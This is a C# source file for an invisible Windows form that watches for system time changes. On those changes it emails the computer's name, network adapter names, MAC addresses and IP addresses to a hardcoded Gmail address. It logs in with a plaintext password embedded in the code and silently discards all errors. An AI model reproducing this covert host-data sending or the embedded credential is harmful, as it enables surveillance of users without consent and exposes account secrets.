using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;

namespace SystemTimeObserverService
{
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Net;
    using System.Net.Mail;
    using System.Windows.Forms;
    using Microsoft.Win32;

    public class HiddenForm : Form
    {
        private readonly System.ComponentModel.IContainer components = null;
        private long counter;

        public HiddenForm()
        {
            InitializeComponent();
        }

        private void HiddenFormLoad(object sender, EventArgs e)
        {
            SystemEvents.TimeChanged += SystemEventsTimeChanged;
        }

        private void HiddenFormFormClosing(object sender, FormClosingEventArgs e)
        {
            SystemEvents.TimeChanged -= SystemEventsTimeChanged;
        }

        private void SystemEventsTimeChanged(object sender, EventArgs e)
        {
            try
            {
                if (counter++%2 != 0) return;

                var fromAddress = new MailAddress("systemtimeobserver@gmail.com", "SystemTimeObserver");

                const string FromPassword = "systemtime321";
                const string Subject = "Alarm!";
                var body = new StringBuilder();

                body.AppendLine(string.Format("System time was changed! New time is {0}", DateTime.Now));
                body.AppendLine("Computer name: " + Environment.MachineName);
                body.AppendLine();
                body.AppendLine("//=========Network interfaces=========//");

                var nics = NetworkInterface.GetAllNetworkInterfaces();
                foreach (var adapter in nics)
                {
                    var adap = adapter;
                    foreach (var ip in adapter.GetIPProperties()
                        .UnicastAddresses
                        .Where(ip => (adap.OperationalStatus == OperationalStatus.Up)
                                     && (ip.Address.AddressFamily == AddressFamily.InterNetwork)))
                    {
                        body.AppendLine(string.Format("{0} -> {1} ({2})", adapter.Name, adapter.GetPhysicalAddress(),
                            ip.Address));
                    }
                }

                var smtp = new SmtpClient
                {
                    Host = "smtp.gmail.com",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, FromPassword)
                };

                var toAddressesList = new List<string> {"mazanuj@gmail.com"};
                foreach (
                    var toAddress in toAddressesList.Select(toAddressString => new MailAddress(toAddressString)))
                {
                    using (
                        var message = new MailMessage(fromAddress, toAddress)
                        {
                            Subject = Subject,
                            Body = body.ToString()
                        })
                    {
                        smtp.Send(message);
                    }
                }
            }
            catch
            {
                //do nothing
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            SuspendLayout();
            AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new System.Drawing.Size(0, 0);
            FormBorderStyle = FormBorderStyle.None;
            Name = "TimeObserver";
            Text = "TimeObserver";
            WindowState = FormWindowState.Minimized;
            Load += HiddenFormLoad;
            FormClosing += HiddenFormFormClosing;
            ResumeLayout(false);
        }
    }
}